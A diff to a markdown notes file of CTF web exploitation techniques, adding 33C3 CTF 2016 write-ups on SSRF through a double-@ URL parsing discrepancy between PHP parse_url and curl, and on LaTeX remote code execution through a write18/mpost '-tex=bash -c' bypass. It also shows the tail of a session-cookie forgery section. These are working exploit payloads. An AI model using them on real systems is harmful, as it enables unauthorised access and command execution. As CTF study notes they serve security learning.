@@ -13,6 +13,8 @@
 - [XSS to SSTI Chain via Flask Error Pages (SECUINSIDE 2016)](#xss-to-ssti-chain-via-flask-error-pages-secuinside-2016)
 - [INSERT INTO Dual-Field SQLi Column Shift (CyberSecurityRumble 2016)](#insert-into-dual-field-sqli-column-shift-cybersecurityrumble-2016)
 - [Session Cookie Forgery via Timestamp-Seeded PRNG (CyberSecurityRumble 2016)](#session-cookie-forgery-via-timestamp-seeded-prng-cybersecurityrumble-2016)
+- [SSRF via parse_url/curl URL Parsing Discrepancy (33C3 CTF 2016)](#ssrf-via-parse_urlcurl-url-parsing-discrepancy-33c3-ctf-2016)
+- [LaTeX RCE via mpost Restricted write18 Bypass (33C3 CTF 2016)](#latex-rce-via-mpost-restricted-write18-bypass-33c3-ctf-2016)
 
 See also: [server-side-advanced.md](server-side-advanced.md) for Part 1 (ExifTool, Go rune/byte mismatch, zip symlink traversal, path traversal bypasses, Flask/Werkzeug debug, XXE external DTD, WeasyPrint SSRF, MongoDB regex injection, Pongo2 SSTI, ZIP PHP webshell, basename() bypass, React Server Components Flight RCE).
 
@@ -388,3 +390,47 @@ admin_cookie = f"{cookie_random}-209"
 ```
 
 **Key insight:** Timestamps used as PRNG seeds for session tokens create a deterministic oracle. If the login timestamp is leaked (via SQLi, error messages, or API responses), the full token is reproducible. This pattern appears whenever session randomness depends on a single predictable seed value (time, PID, counter). Check for `random.seed(time())` or `srand(time(NULL))` in session generation code.
+
+---
+
+## SSRF via parse_url/curl URL Parsing Discrepancy (33C3 CTF 2016)
+
+**Pattern (list0r):** PHP `parse_url()` and curl interpret URLs with multiple `@` symbols differently. The URL `http://what:ever@127.0.0.1:80@allowed.host/path` causes PHP to see `host = allowed.host` (passing a CIDR/domain whitelist check), while curl resolves to `127.0.0.1:80` (treating the second `@` as literal), achieving SSRF to localhost.
+
+```php
+// PHP parse_url behavior:
+parse_url("http://what:ever@127.0.0.1:80@allowed.host/path");
+// => ['host' => 'allowed.host', 'user' => 'what', ...]
+
+// curl behavior with same URL:
+// Connects to 127.0.0.1:80 (first @ delimits credentials)
+// "ever@127.0.0.1:80" parsed as password, but curl connects to first IP
+
+// Exploit: bypass CIDR blacklist by making parse_url see whitelisted host
+$url = "http://x:x@127.0.0.1:80@" . $allowed_domain . "/secret/flag";
+// parse_url sees $allowed_domain -> passes check
+// curl connects to 127.0.0.1:80 -> SSRF achieved
+```
+
+**Key insight:** URL parsers disagree on how to handle multiple `@` symbols. This is distinct from the single-`@` bypass (EKOPARTY 2016) — here the double-`@` exploits a different parsing ambiguity where `parse_url` takes the last `@` as the userinfo delimiter while curl uses the first. Test both variants when facing URL-based SSRF filters.
+
+---
+
+## LaTeX RCE via mpost Restricted write18 Bypass (33C3 CTF 2016)
+
+**Pattern (pdfmaker):** When `pdflatex` runs with `write18` in restricted mode (only whitelisted commands like `mpost` allowed), exploit `mpost`'s `-tex` flag to specify an alternative TeX processor — setting it to `bash -c (command)` achieves shell execution. Use `${IFS}` as space replacement since mpost's argument parsing strips spaces.
+
+```latex
+% Create a MetaPost file via LaTeX
+\begin{filecontents}{test.mp}
+beginfig(1); endfig; end;
+\end{filecontents}
+
+% Execute mpost with bash as the "TeX processor"
+\immediate\write18{mpost -ini "-tex=bash -c (cat${IFS}/flag)>out.log" "test.mp"}
+
+% Read the output back into the PDF
+\input{out.log}
+```
+
+**Key insight:** `mpost` is whitelisted by restricted `write18` because it's needed for MetaPost diagrams. But its `-tex` flag allows specifying an arbitrary program as the "TeX processor," including `bash`. This transforms a restricted shell escape into full RCE. `${IFS}` replaces spaces to work within the quoted argument.
